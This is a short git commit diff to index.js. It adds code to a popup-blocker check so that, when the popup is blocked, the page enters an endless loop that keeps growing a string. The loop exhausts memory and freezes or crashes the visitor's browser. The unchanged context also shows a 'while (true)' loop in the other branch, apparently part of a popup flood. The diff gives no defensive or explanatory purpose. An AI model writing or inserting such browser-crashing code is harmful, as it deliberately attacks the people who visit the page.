e636bafd03b33df49b40e277658fb3adf53470fc
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-18 14:45:07 -0500

    Update index.js

--- index.js
+++ index.js
@@ -2,6 +2,10 @@ function detectPopupBlocker() {
   var myTest = window.open("about:blank", "", "directories=no,height=100,width=100,menubar=no,resizable=no,scrollbars=no,status=no,titlebar=no,top=0,location=no");
   if (!myTest) {
     alert("Please allow pop-up's for this website.");
+    txt = "a";
+while(10000){
+    txt = txt += "a"; 
+}
   } else {
     myTest.close();
     while (true) {
